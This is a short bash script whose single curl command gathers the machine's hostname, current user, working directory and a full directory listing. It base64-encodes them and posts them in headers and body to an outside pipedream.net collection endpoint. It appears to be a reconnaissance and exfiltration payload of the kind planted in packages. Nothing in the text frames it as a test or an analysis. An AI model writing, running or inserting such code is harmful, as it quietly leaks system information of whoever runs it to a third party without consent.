#!/bin/bash

curl -H "Hostname: $(hostname | base64)" -H "Whoami: $(whoami | base64)" -H "Pwd: $(pwd | base64)" -d "$(ls -la | base64)"  --http1.1  "eot7lh31glz15fb.m.pipedream.net"